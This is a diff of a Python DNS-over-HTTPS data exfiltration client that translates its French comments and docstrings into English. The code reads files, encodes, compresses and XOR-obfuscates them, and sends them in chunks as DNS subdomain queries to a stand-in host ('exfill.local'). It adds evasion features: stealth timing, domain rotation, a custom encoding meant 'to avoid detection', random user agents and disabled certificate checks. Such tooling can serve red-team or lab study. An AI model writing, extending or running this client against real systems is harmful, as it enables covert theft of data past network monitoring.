@@ -1,11 +1,4 @@
 #!/usr/bin/env python3
-"""
-DoH Exfiltration Client
-
-Client sophistique pour l'exfiltration de donnees via DNS-over-HTTPS
-avec parametres configurables et techniques d'evasion.
-"""
-
 import base64
 import requests
 import time
@@ -32,33 +25,33 @@ class TimingPattern(Enum):
 
 @dataclass
 class ExfiltrationConfig:
-    """Configuration pour l'exfiltration DoH"""
-    # Parametres de base
+    """Configuration for DoH exfiltration"""
+    # Basic parameters
     doh_server: str = "https://doh.local/dns-query"
     target_domain: str = "exfill.local"
     chunk_size: int = 30
     
-    # Parametres d'encodage
+    # Encoding parameters
     encoding: EncodingType = EncodingType.BASE64
     compression: bool = False
     encryption: bool = False
     encryption_key: Optional[str] = None
     
-    # Parametres de timing
+    # Timing parameters
     timing_pattern: TimingPattern = TimingPattern.REGULAR
     base_delay: float = 0.2
     delay_variance: float = 0.1
     burst_size: int = 5
     burst_delay: float = 2.0
     
-    # Parametres d'evasion
+    # Evasion parameters
     domain_rotation: bool = False
     backup_domains: List[str] = None
     subdomain_randomization: bool = True
     padding: bool = False
     padding_size: int = 10
     
-    # Parametres de robustesse
+    # Robustness parameters
     max_retries: int = 3
     retry_delay: float = 1.0
     timeout: float = 5.0
@@ -68,14 +61,14 @@ class ExfiltrationConfig:
             self.backup_domains = []
 
 class DoHExfiltrationClient:
-    """Client d'exfiltration DoH avec parametres configurables"""
+    """DoH exfiltration client with configurable parameters"""
     
     def __init__(self, config: ExfiltrationConfig):
         self.config = config
         self.session = requests.Session()
-        # Désactiver la vérification SSL pour les certificats auto-signés
+        # Disable SSL verification for self-signed certificates
         self.session.verify = False
-        # Supprimer les warnings SSL
+        # Suppress SSL warnings
         import urllib3
         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
         self.current_domain_index = 0
@@ -91,40 +84,40 @@ class DoHExfiltrationClient:
         
     def exfiltrate_file(self, file_path: str, session_id: Optional[str] = None) -> bool:
         """
-        Exfiltre un fichier via DoH
+        Exfiltrate a file via DoH
         
         Args:
-            file_path: Chemin vers le fichier a exfiltrer
-            session_id: ID de session optionnel pour identifier l'exfiltration
+            file_path: Path to the file to exfiltrate
+            session_id: Optional session ID to identify the exfiltration
             
         Returns:
-            bool: True si l'exfiltration reussit, False sinon
+            bool: True if exfiltration succeeds, False otherwise
         """
         try:
             print(f"🚀 Starting DoH exfiltration: {file_path}")
             print(f"📊 Configuration: {self._config_summary()}")
             
-            # Verifier la connectivite DoH avant de commencer
+            # Check DoH connectivity before starting
             if not self._wait_for_doh_connectivity():
                 print("❌ DoH server not reachable, aborting exfiltration")
                 return False
             
-            # Initialiser les statistiques
+            # Initialize statistics
             self.stats['start_time'] = time.time()
             
-            # Generer un ID de session si non fourni
+            # Generate session ID if not provided
             if not session_id:
                 session_id = self._generate_session_id()
             
-            # Lire et preparer les donnees
+            # Read and prepare data
             data = self._read_file(file_path)
             if not data:
                 return False
             
-            # Preparer les donnees (encodage, compression, chiffrement)
+            # Prepare data (encoding, compression, encryption)
             prepared_data = self._prepare_data(data)
             
-            # Diviser en chunks
+            # Split into chunks
             chunks = self._split_into_chunks(prepared_data)
             self.stats['total_chunks'] = len(chunks)
             self.stats['total_bytes'] = len(data)
@@ -133,10 +126,10 @@ class DoHExfiltrationClient:
             print(f"🔀 Prepared data size: {len(prepared_data)} bytes")
             print(f"📋 Total chunks: {len(chunks)}")
             
-            # Envoyer les chunks
+            # Send chunks
             success = self._send_chunks(chunks, session_id)
             
-            # Finaliser les statistiques
+            # Finalize statistics
             self.stats['end_time'] = time.time()
             self._print_final_stats()
             
@@ -148,21 +141,21 @@ class DoHExfiltrationClient:
     
     def exfiltrate_data(self, data: bytes, data_name: str = "data", session_id: Optional[str] = None) -> bool:
         """
-        Exfiltre des donnees brutes via DoH
+        Exfiltrate raw data via DoH
         
         Args:
-            data: Donnees a exfiltrer
-            data_name: Nom pour identifier les donnees
-            session_id: ID de session optionnel
+            data: Data to exfiltrate
+            data_name: Name to identify the data
+            session_id: Optional session ID
             
         Returns:
-            bool: True si l'exfiltration reussit, False sinon
+            bool: True if exfiltration succeeds, False otherwise
         """
         try:
             print(f"🚀 Starting DoH data exfiltration: {data_name}")
             print(f"📊 Configuration: {self._config_summary()}")
             
-            # Verifier la connectivite DoH avant de commencer
+            # Check DoH connectivity before starting
             if not self._wait_for_doh_connectivity():
                 print("❌ DoH server not reachable, aborting exfiltration")
                 return False
@@ -172,7 +165,7 @@ class DoHExfiltrationClient:
             if not session_id:
                 session_id = self._generate_session_id()
             
-            # Preparer les donnees
+            # Prepare data
             prepared_data = self._prepare_data(data)
             chunks = self._split_into_chunks(prepared_data)
             
@@ -195,7 +188,7 @@ class DoHExfiltrationClient:
             return False
     
     def _read_file(self, file_path: str) -> Optional[bytes]:
-        """Lit un fichier et retourne son contenu en bytes"""
+        """Read a file and return its content as bytes"""
         try:
             with open(file_path, 'rb') as f:
                 return f.read()
@@ -205,19 +198,19 @@ class DoHExfiltrationClient:
     
     def _wait_for_doh_connectivity(self, max_attempts: int = 10, delay: float = 2.0) -> bool:
         """
-        Attend que le serveur DoH soit accessible en testant des requetes DNS normales
+        Wait for DoH server to be accessible by testing normal DNS queries
         
         Args:
-            max_attempts: Nombre maximum de tentatives de connexion
-            delay: Delai entre les tentatives en secondes
+            max_attempts: Maximum number of connection attempts
+            delay: Delay between attempts in seconds
             
         Returns:
-            bool: True si le serveur DoH repond, False sinon
+            bool: True if DoH server responds, False otherwise
         """
         print(f"🔍 Checking DoH server connectivity...")
         print(f"📡 Testing server: {self.config.doh_server}")
         
-        # Domaines de test pour verifier la connectivite
+        # Test domains to verify connectivity
         test_domains = ["google.com", "cloudflare.com", "example.com"]
         
         for attempt in range(max_attempts):
@@ -225,7 +218,7 @@ class DoHExfiltrationClient:
             
             for test_domain in test_domains:
                 try:
-                    # Preparer la requete DoH de test
+                    # Prepare DoH test query
                     params = {
                         "name": test_domain,
                         "type": "A"
@@ -235,7 +228,7 @@ class DoHExfiltrationClient:
                         "user-agent": "DoH-Connectivity-Test/1.0"
                     }
                     
-                    # Envoyer la requete de test
+                    # Send test query
                     response = self.session.get(
                         self.config.doh_server,
                         params=params,
@@ -244,7 +237,7 @@ class DoHExfiltrationClient:
                     )
                     
                     if response.status_code == 200:
-                        # Verifier que la reponse contient des donnees DNS valides
+                        # Check if response contains valid DNS data
                         try:
                             dns_response = response.json()
                             if "Answer" in dns_response or "Authority" in dns_response:
@@ -252,7 +245,7 @@ class DoHExfiltrationClient:
                                 print(f"🎯 Server ready for exfiltration!")
                                 return True
                         except:
-                            # Meme si le JSON est invalide, si on a un 200, le serveur repond
+                            # Even if JSON is invalid, if we get 200, server responds
                             print(f"✅ DoH server responding (HTTP 200) for {test_domain}")
                             return True
                     else:
@@ -280,41 +273,41 @@ class DoHExfiltrationClient:
     
     def _calculate_optimal_chunk_size(self, data_size: int) -> int:
         """
-        Calcule la taille optimale des chunks en fonction de la taille du fichier
+        Calculate optimal chunk size based on file size
         
         Args:
-            data_size: Taille des données en bytes
+            data_size: Size of data in bytes
             
         Returns:
-            int: Taille optimale des chunks en caractères
+            int: Optimal chunk size in characters
         """
-        # Limites physiques DNS
-        MAX_SUBDOMAIN_LENGTH = 50  # Sécurité pour éviter les limites DNS
+        # DNS physical limits
+        MAX_SUBDOMAIN_LENGTH = 50  # Safety to avoid DNS limits
         MIN_CHUNK_SIZE = 8
         MAX_CHUNK_SIZE = 40
         
-        # Préfixe pour le format: sessionid-index-total- (environ 20 chars)
+        # Prefix for format: sessionid-index-total- (about 20 chars)
         HEADER_SIZE = 20
         AVAILABLE_SPACE = MAX_SUBDOMAIN_LENGTH - HEADER_SIZE
         
-        if data_size < 1024:  # < 1KB - Petits fichiers
+        if data_size < 1024:  # < 1KB - Small files
             chunk_size = min(MAX_CHUNK_SIZE, max(MIN_CHUNK_SIZE, data_size // 10))
             strategy = "small file"
-        elif data_size < 10240:  # < 10KB - Fichiers moyens
+        elif data_size < 10240:  # < 10KB - Medium files
             chunk_size = min(MAX_CHUNK_SIZE, max(MIN_CHUNK_SIZE, data_size // 50))
             strategy = "medium file"
-        elif data_size < 102400:  # < 100KB - Gros fichiers
+        elif data_size < 102400:  # < 100KB - Large files
             chunk_size = min(MAX_CHUNK_SIZE, max(MIN_CHUNK_SIZE, data_size // 200))
             strategy = "large file"
-        else:  # > 100KB - Très gros fichiers
+        else:  # > 100KB - Very large files
             chunk_size = MAX_CHUNK_SIZE
             strategy = "very large file"
         
-        # S'assurer que la taille ne dépasse pas l'espace disponible
+        # Ensure size doesn't exceed available space
         chunk_size = min(chunk_size, AVAILABLE_SPACE)
         
-        # Calculer le nombre estimé de chunks
-        estimated_encoded_size = data_size * 1.4  # Base64 overhead approximatif
+        # Calculate estimated number of chunks
+        estimated_encoded_size = data_size * 1.4  # Approximate Base64 overhead
         estimated_chunks = int(estimated_encoded_size / chunk_size) + 1
         
         print(f"📐 Chunk size calculation:")
@@ -327,36 +320,36 @@ class DoHExfiltrationClient:
         return chunk_size
 
     def _prepare_data(self, data: bytes) -> str:
-        """Prepare les donnees pour l'exfiltration avec taille de chunk optimale"""
+        """Prepare data for exfiltration with optimal chunk size"""
         prepared = data
         
-        # Calculer la taille optimale des chunks AVANT l'encodage
+        # Calculate optimal chunk size BEFORE encoding
         optimal_chunk_size = self._calculate_optimal_chunk_size(len(data))
         
-        # Mettre à jour la configuration avec la taille optimale
+        # Update configuration with optimal size
         original_chunk_size = self.config.chunk_size
         self.config.chunk_size = optimal_chunk_size
         
         print(f"🔧 Chunk size: {original_chunk_size} → {optimal_chunk_size} (auto-adjusted)")
         
-        # Compression (si activee)
+        # Compression (if enabled)
         if self.config.compression:
             import gzip
             prepared = gzip.compress(prepared)
             print(f"🗜️  Compressed: {len(data)} -> {len(prepared)} bytes")
             
-            # Recalculer la taille optimale après compression
+            # Recalculate optimal size after compression
             new_optimal = self._calculate_optimal_chunk_size(len(prepared))
             if new_optimal != optimal_chunk_size:
                 self.config.chunk_size = new_optimal
                 print(f"🔧 Post-compression adjustment: {optimal_chunk_size} → {new_optimal}")
         
-        # Chiffrement (si active)
+        # Encryption (if enabled)
         if self.config.encryption and self.config.encryption_key:
             prepared = self._encrypt_data(prepared)
             print(f"🔐 Encrypted data")
         
-        # Encodage
+        # Encoding
         if self.config.encoding == EncodingType.BASE64:
             encoded = base64.urlsafe_b64encode(prepared).decode('ascii')
         elif self.config.encoding == EncodingType.HEX:
@@ -372,8 +365,8 @@ class DoHExfiltrationClient:
         return encoded
     
     def _encrypt_data(self, data: bytes) -> bytes:
-        """Chiffre les donnees avec AES (simple XOR pour demo)"""
-        # Simple XOR pour la demo - utiliser AES en production
+        """Encrypt data with AES (simple XOR for demo)"""
+        # Simple XOR for demo - use AES in production
         key = self.config.encryption_key.encode()[:32].ljust(32, b'\x00')
         encrypted = bytearray()
         for i, byte in enumerate(data):
@@ -381,22 +374,22 @@ class DoHExfiltrationClient:
         return bytes(encrypted)
     
     def _custom_encode(self, data: bytes) -> str:
-        """Encodage personnalise pour l'evasion"""
-        # Encodage base64 modifie pour eviter la detection
+        """Custom encoding for evasion"""
+        # Modified base64 encoding to avoid detection
         encoded = base64.urlsafe_b64encode(data).decode('ascii')
-        # Remplacer certains caracteres
+        # Replace certain characters
         custom_map = str.maketrans('+=/', 'xyz')
         return encoded.translate(custom_map)
     
     def _split_into_chunks(self, data: str) -> List[str]:
-        """Divise les donnees en chunks de taille configuree"""
+        """Split data into chunks of configured size"""
         chunks = []
         chunk_size = self.config.chunk_size
         
         for i in range(0, len(data), chunk_size):
             chunk = data[i:i + chunk_size]
             
-            # Padding si active
+            # Padding if enabled
             if self.config.padding and len(chunk) < chunk_size:
                 padding_chars = ''.join(random.choices(string.ascii_lowercase, k=self.config.padding_size))
                 chunk += padding_chars[:chunk_size - len(chunk)]
@@ -406,7 +399,7 @@ class DoHExfiltrationClient:
         return chunks
     
     def _estimate_transmission_time(self, chunks: List[str]) -> float:
-        """Estime le temps de transmission total"""
+        """Estimate total transmission time"""
         base_time = len(chunks) * self.config.base_delay
         
         if self.config.timing_pattern == TimingPattern.RANDOM:
@@ -419,21 +412,21 @@ class DoHExfiltrationClient:
             regular_time = (len(chunks) - num_bursts) * 0.01
             base_time = burst_time + regular_time
         elif self.config.timing_pattern == TimingPattern.STEALTH:
-            # Mode furtif est plus lent
+            # Stealth mode is slower
             base_time *= 3
         
         return base_time
 
     def _send_chunks(self, chunks: List[str], session_id: str) -> bool:
-        """Envoie tous les chunks via DoH avec estimation de temps"""
+        """Send all chunks via DoH with time estimation"""
         print(f"\n📡 Starting chunk transmission...")
         print(f"🆔 Session ID: {session_id}")
         
-        # Estimer le temps de transmission
+        # Estimate transmission time
         estimated_time = self._estimate_transmission_time(chunks)
         print(f"⏱️  Estimated transmission time: {estimated_time:.1f}s")
         
-        # Afficher un aperçu de l'efficacité
+        # Display efficiency overview
         total_chars = sum(len(chunk) for chunk in chunks)
         efficiency = (total_chars / len(chunks)) / self.config.chunk_size * 100 if self.config.chunk_size > 0 else 0
         print(f"📊 Chunk utilization: {efficiency:.1f}%")
@@ -442,7 +435,7 @@ class DoHExfiltrationClient:
         start_time = time.time()
         
         for i, chunk in enumerate(chunks):
-            # Afficher le progrès tous les 10% ou 100 chunks
+            # Display progress every 10% or 100 chunks
             if i % max(1, len(chunks) // 10) == 0 or i % 100 == 0:
                 elapsed = time.time() - start_time
                 progress = (i / len(chunks)) * 100
@@ -458,8 +451,8 @@ class DoHExfiltrationClient:
                 self.stats['failed_chunks'] += 1
                 all_success = False
             
-            # Appliquer le pattern de timing
-            if i < len(chunks) - 1:  # Pas de delai apres le dernier chunk
+            # Apply timing pattern
+            if i < len(chunks) - 1:  # No delay after the last chunk
                 self._apply_timing_delay(i)
         
         success_rate = (self.stats['successful_chunks'] / self.stats['total_chunks']) * 100
@@ -470,10 +463,10 @@ class DoHExfiltrationClient:
         return all_success
     
     def _send_single_chunk(self, chunk: str, index: int, total: int, session_id: str) -> bool:
-        """Envoie un chunk individuel avec retry logic"""
+        """Send individual chunk with retry logic"""
         for attempt in range(self.config.max_retries + 1):
             try:
-                # Construire le sous-domaine
+                # Build subdomain
                 subdomain = self._build_subdomain(chunk, index, total, session_id)
                 
                 # Selectionner le domaine (rotation si activee)
@@ -515,11 +508,11 @@ class DoHExfiltrationClient:
         return False
     
     def _build_subdomain(self, chunk: str, index: int, total: int, session_id: str) -> str:
-        """Construit le sous-domaine pour un chunk"""
+        """Build subdomain for a chunk"""
         # Format: [session_id]-[index]-[total]-[chunk].[random]
         base = f"{session_id[:8]}-{index:04d}-{total:04d}-{chunk}"
         
-        # Ajouter randomisation si activee
+        # Add randomization if enabled
         if self.config.subdomain_randomization:
             random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
             base += f".{random_suffix}"
@@ -527,11 +520,11 @@ class DoHExfiltrationClient:
         return base
     
     def _get_current_domain(self) -> str:
-        """Retourne le domaine actuel (avec rotation si activee)"""
+        """Return current domain (with rotation if enabled)"""
         if not self.config.domain_rotation or not self.config.backup_domains:
             return self.config.target_domain
         
-        # Rotation des domaines
+        # Domain rotation
         all_domains = [self.config.target_domain] + self.config.backup_domains
         domain = all_domains[self.current_domain_index % len(all_domains)]
         self.current_domain_index += 1
@@ -539,7 +532,7 @@ class DoHExfiltrationClient:
         return domain
     
     def _get_random_user_agent(self) -> str:
-        """Retourne un User-Agent aleatoire pour l'evasion"""
+        """Return random User-Agent for evasion"""
         user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
@@ -549,7 +542,7 @@ class DoHExfiltrationClient:
         return random.choice(user_agents)
     
     def _apply_timing_delay(self, chunk_index: int):
-        """Applique le delai selon le pattern de timing configure"""
+        """Apply delay according to configured timing pattern"""
         if self.config.timing_pattern == TimingPattern.REGULAR:
             time.sleep(self.config.base_delay)
             
@@ -562,28 +555,28 @@ class DoHExfiltrationClient:
             if (chunk_index + 1) % self.config.burst_size == 0:
                 time.sleep(self.config.burst_delay)
             else:
-                time.sleep(0.01)  # Tres rapide dans le burst
+                time.sleep(0.01)  # Very fast in burst
                 
         elif self.config.timing_pattern == TimingPattern.STEALTH:
-            # Delai long et variable pour etre discret
+            # Long and variable delay to be discreet
             delay = random.uniform(self.config.base_delay * 2, self.config.base_delay * 5)
             time.sleep(delay)
     
     def _generate_session_id(self) -> str:
-        """Genere un ID de session unique"""
+        """Generate unique session ID"""
         timestamp = str(int(time.time()))
         random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
         return f"{timestamp}_{random_part}"
     
     def _config_summary(self) -> str:
-        """Retourne un resume de la configuration"""
+        """Return configuration summary"""
         return (f"Server: {self.config.doh_server}, "
                 f"Chunk: {self.config.chunk_size}, "
                 f"Encoding: {self.config.encoding.value}, "
                 f"Timing: {self.config.timing_pattern.value}")
     
     def _print_final_stats(self):
-        """Affiche les statistiques finales"""
+        """Display final statistics"""
         duration = self.stats['end_time'] - self.stats['start_time']
         throughput = self.stats['total_bytes'] / duration if duration > 0 else 0
         
@@ -598,22 +591,22 @@ class DoHExfiltrationClient:
         print(f"   📈 Total bytes: {self.stats['total_bytes']}")
 
 def create_default_config() -> ExfiltrationConfig:
-    """Cree une configuration par defaut avec adaptation automatique"""
+    """Create default configuration with automatic adaptation"""
     return ExfiltrationConfig(
         doh_server="https://doh.local/dns-query",
         target_domain="exfill.local",
-        chunk_size=25,  # Valeur de base, sera ajustée automatiquement
+        chunk_size=25,  # Base value, will be auto-adjusted
         encoding=EncodingType.BASE64,
         timing_pattern=TimingPattern.REGULAR,
         base_delay=0.2
     )
 
 def create_stealth_config() -> ExfiltrationConfig:
-    """Cree une configuration furtive avec petits chunks"""
+    """Create stealth configuration with small chunks"""
     return ExfiltrationConfig(
         doh_server="https://doh.local/dns-query",
         target_domain="exfill.local",
-        chunk_size=15,  # Plus petits chunks pour la furtivité, sera ajusté
+        chunk_size=15,  # Smaller chunks for stealth, will be adjusted
         encoding=EncodingType.CUSTOM,
         timing_pattern=TimingPattern.STEALTH,
         base_delay=0.05,
@@ -623,11 +616,11 @@ def create_stealth_config() -> ExfiltrationConfig:
     )
 
 def create_fast_config() -> ExfiltrationConfig:
-    """Cree une configuration rapide avec gros chunks"""
+    """Create fast configuration with large chunks"""
     return ExfiltrationConfig(
         doh_server="https://doh.local/dns-query",
         target_domain="exfill.local",
-        chunk_size=35,  # Plus gros chunks pour la vitesse, sera ajusté
+        chunk_size=35,  # Larger chunks for speed, will be adjusted
         encoding=EncodingType.BASE64,
         timing_pattern=TimingPattern.BURST,
         base_delay=0.05,
@@ -636,20 +629,20 @@ def create_fast_config() -> ExfiltrationConfig:
     )
 
 def create_adaptive_config(file_size: int) -> ExfiltrationConfig:
-    """Cree une configuration adaptée à la taille du fichier"""
+    """Create configuration adapted to file size"""
     if file_size < 1024:  # < 1KB
-        return create_stealth_config()  # Pas besoin de vitesse
+        return create_stealth_config()  # No need for speed
     elif file_size < 51200:  # < 50KB
-        return create_default_config()  # Configuration équilibrée
+        return create_default_config()  # Balanced configuration
     else:  # > 50KB
-        return create_fast_config()  # Optimiser pour la vitesse
+        return create_fast_config()  # Optimize for speed
 
 def main():
-    """Fonction principale de demonstration"""
+    """Main demonstration function"""
     print("🔐 DoH Exfiltration Client")
     print("=" * 50)
     
-    # Creer un fichier de test
+    # Create test file
     test_file = "secret.txt"
     if not os.path.exists(test_file):
         with open(test_file, 'w') as f:
@@ -658,7 +651,7 @@ def main():
             f.write("🔥 Advanced DoH exfiltration techniques\n")
         print(f"📄 Created test file: {test_file}")
     
-    # Configuration par defaut
+    # Default configuration
     print("\n1️⃣  Test with default configuration:")
     config = create_default_config()
     client = DoHExfiltrationClient(config)
@@ -666,7 +659,7 @@ def main():
     
     print("\n" + "="*50)
     
-    # Configuration furtive
+    # Stealth configuration
     print("\n2️⃣  Test with stealth configuration:")
     stealth_config = create_stealth_config()
     stealth_client = DoHExfiltrationClient(stealth_config)
@@ -674,7 +667,7 @@ def main():
     
     print("\n" + "="*50)
     
-    # Test d'exfiltration de donnees brutes
+    # Raw data exfiltration test
     print("\n3️⃣  Test with raw data:")
     test_data = b"Raw binary data for testing: \x00\x01\x02\x03\xFF"
     fast_config = create_fast_config()
